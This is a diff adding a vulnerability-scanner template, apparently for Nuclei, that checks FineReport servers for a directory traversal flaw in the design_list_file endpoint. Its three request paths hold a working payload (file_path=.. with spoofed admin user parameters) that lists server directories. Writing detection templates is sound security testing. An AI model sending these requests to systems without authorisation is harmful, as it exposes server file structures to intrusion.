@@ -1,0 +1,25 @@
+id: finereport-design-list-file-directory-traversal
+info:
+  name: FineReport design_list_file Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+  description: |
+    This template detects a directory traversal vulnerability in FineReport's design_list_file endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true"
+      - "{{BaseURL}}/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true"
+      - "{{BaseURL}}/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "isDir"
+          - "envPath"
